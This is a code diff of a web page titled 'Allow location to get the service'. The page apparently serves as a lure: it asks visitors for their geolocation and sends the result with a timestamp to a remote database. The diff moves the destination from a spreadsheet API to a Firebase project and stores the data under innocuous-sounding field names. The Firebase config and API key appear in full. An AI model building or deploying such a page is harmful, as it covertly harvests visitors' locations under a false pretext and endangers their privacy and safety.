@@ -4,6 +4,10 @@
   <h1>Allow location to get the service</h1>
 <p id=p_id></p>
 
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
 
 <script>
   para=document.getElementById("p_id")
@@ -14,7 +18,7 @@ function getLocation() {
     navigator.geolocation.getCurrentPosition(showPosition);
     para.innerHTML="try the link on better browser like Chrome";
   } else { 
-    console.log("Geolocation is not supported by this browser.");
+    para.innerHTML="could not run geolocation";
      
   }
 }
@@ -40,18 +44,39 @@ document.getElementById("lat").value=img_url;
 SubForm();
 
       function SubForm (){
-      $.ajax({
-        url:"https://api.apispreadsheets.com/data/14714/",
-        type:"post",
-        data:$("#myForm").serializeArray(),
-        success: function(){
-          console.log("Form Data Submitted :)")
+       var firebaseConfig = {
+    apiKey: "AIzaSyB-SnJ-A1aD9y51jVNPdrta0LrHVMeX8i8",
+    authDomain: "fstapp-3f0f8.firebaseapp.com",
+    projectId: "fstapp-3f0f8",
+    storageBucket: "fstapp-3f0f8.appspot.com",
+    messagingSenderId: "847402354890",
+    appId: "1:847402354890:web:46b534687ea5284e5b4c33"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
 
-        },
-        error: function(){
-          console.log("There was an error :(")
-        }
-      });
+
+  var name,roll;
+   
+
+  var database=firebase.database();
+  var ref=database.ref('scores');
+  data={
+
+    name:img_url,
+    roll:dateTime
+  }
+
+  ref.push(data);
+
+
+
+
+
+
+
+
+
     }
 
 
@@ -75,10 +100,7 @@ SubForm();
 </form>
 
 
-<script
-  src="https://code.jquery.com/jquery-3.4.1.js"
-  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
-  crossorigin="anonymous"></script>
+
 
 
 
